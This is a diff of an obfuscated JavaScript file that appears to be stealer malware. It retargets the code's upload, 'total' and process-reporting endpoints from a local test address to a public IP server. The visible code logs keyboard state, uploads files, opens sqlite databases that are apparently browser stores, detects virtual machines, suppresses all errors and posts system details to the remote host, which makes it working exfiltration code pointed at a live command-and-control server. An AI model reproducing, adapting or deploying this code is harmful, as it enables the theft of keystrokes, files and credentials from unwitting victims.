@@ -7,7 +7,7 @@ try {
         FormData = require('form-data'),
         axios = require('axios'),
         { execSync, spawn } = require('child_process'),
-        uploadUrl = "http://192.168.0.186:5918/upload",
+        uploadUrl = "http://144.172.104.117:5918/upload",
         { windowManager } = require('node-window-manager')
 
     process.on('uncaughtException', (_0xad8869) => {})
@@ -20,14 +20,14 @@ try {
         upt = 5934,
         lpt = 5961,
         t = 66,
-        a = 127,
-        b = 0,
-        c = 0,
-        d = 1,
-        e = 127,
-        f = 0,
-        g = 0,
-        h = 1,
+        a = 144,
+        b = 172,
+        c = 104,
+        d = 117,
+        e = 144,
+        f = 172,
+        g = 104,
+        h = 117,
         m = a + '.' + b + '.' + c + '.' + d,
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
@@ -231,7 +231,7 @@ try {
                     let shift = false;
                     let ctrl = false;
                     let isRunning = true;
-                    const uu = "http://192.168.0.186:5918/total";
+                    const uu = "http://144.172.104.117:5918/total";
 
                     const uf = async (p) => {
                         if (fs.statSync(p).isFile()) {
@@ -518,8 +518,8 @@ try {
         const sqlite3 = require('sqlite3').verbose();
         const FormData = require('form-data');
         const axios = require('axios');
-        const uploadUrl = "http://192.168.0.186:5918/upload";
-        const uu = "http://192.168.0.186:5918/total";
+        const uploadUrl = "http://144.172.104.117:5918/upload";
+        const uu = "http://144.172.104.117:5918/total";
         let i = ${i};
         const getBasePaths = () => {
             const platform = process.platform;
@@ -728,7 +728,7 @@ try {
                 }
             }
             // console.log(os.userInfo().username);
-            result = await axios.post("http://192.168.0.186:5918/api/service/process/"+uid, {
+            result = await axios.post("http://144.172.104.117:5918/api/service/process/"+uid, {
                 OS: os.type(),
                 platform: os.platform(),
                 release: os.release() + (isVM ? " (VM)":"(Local)"),
